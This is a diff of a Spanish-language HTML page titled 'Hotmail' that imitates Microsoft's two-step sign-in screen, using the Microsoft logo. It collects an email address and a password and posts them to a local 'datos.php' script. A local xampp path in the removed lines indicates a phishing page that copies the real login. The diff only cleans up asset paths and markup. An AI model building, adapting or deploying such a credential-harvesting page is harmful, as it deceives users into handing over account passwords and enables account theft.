@@ -1,6 +1,6 @@
 <!DOCTYPE html>
-<html><head>
-<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<html>
+<head>
 	<title>Hotmail</title>
 	<style>
 img[src*=""] {
@@ -46,15 +46,15 @@ img[src*=""] {
 
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-	<link rel="stylesheet" type="text/css" href="indexx_files/estilos.css">
-	<link rel="stylesheet" type="text/css" href="indexx_files/fontello.css">
-	<link rel="icon" href="file:///C:/xampp/htdocs/hotmail/img/logo.jpg">
+	<link rel="stylesheet" type="text/css" href="css/estilos.css">
+	<link rel="stylesheet" type="text/css" href="css/fontello.css">
+	<link rel="icon" href="img/logo.jpg">
 </head>
 <body>
     	<div class="content-box">
     		<form action="datos.php" method="post">
                 <div class="content-one">
-    			<section class="header"><img src="indexx_files/microsoft_logo.svg"></section>
+    			<section class="header"><img src="img/microsoft_logo.svg"></section>
     			<h3>Iniciar sesión</h3>
     			<input id="email" class="email" type="email" name="email" placeholder="Correo electrónico,teléfono o Skype" required="true">
                 <input type="button" value="Siguiente" class="btn-enviar" onclick="document.getElementById('textemail').innerHTML = 
@@ -63,14 +63,14 @@ img[src*=""] {
     				<a href="#" class="one">¿No tiene una cuenta?</a>
     				<a href="#" class="second">Crea una.</a>
 					<h3><a href="#" class="second">Iniciar sesión con una llave de seguridad?</a></h3>
-					<h2><a href="#" class="second">Opciones de seguridad.</a></h2><a href="#" class="second">
-    			</a></div><a href="#" class="second">
-                </a></div><a href="#" class="second">
-                </a><div class="content-other"><a href="#" class="second">
-                   <section class="header"><img src="indexx_files/microsoft_logo.svg"></section>
-                   </a><a class="content-name"><i class="icon-left"></i> <div id="textemail"></div></a>
+					<h2><a href="#" class="second">Opciones de seguridad.</h2>
+    			</div>
+                </div>
+                <div class="content-other">
+                   <section class="header"><img src="img/microsoft_logo.svg"></section>
+                   <a class="content-name"><i class="icon-left"></i> <div id="textemail"></div></a>
                    <h3>Escribir contraseña</h3>
-                   <input type="password" name="pass" class="pass" placeholder="Contraseña" required="true" id="pass">
+                   <input type="password" name="pass" class="pass" placeholder="Contraseña" required="true" id = "pass">
                    <div class="question-dos">
                       <a href="#!" class="dos"><input type="checkbox" name="checkbox">Mantener la sesión iniciada</a>
                       <a href="#!" class="one">Olvidó su contraseña?</a>
@@ -82,12 +82,12 @@ img[src*=""] {
     	<footer>
     		<div class="content-items">
     			<a href="#" class="points">...</a>
-    			<a href="#">Privacidad &amp; cookies</a>
+    			<a href="#">Privacidad & cookies</a>
     			<a href="#">Terminos de uso</a>
     			
     		</div>
     	</footer>
-           <script type="text/javascript" src="indexx_files/jquery.js"></script>
-               <script type="text/javascript" src="indexx_files/archivo.js"></script>
-
-</body></html>
+           <script type="text/javascript" src="js/jquery.min.js"></script>
+               <script type="text/javascript" src="js/archivo.js"></script>
+</body>
+</html>
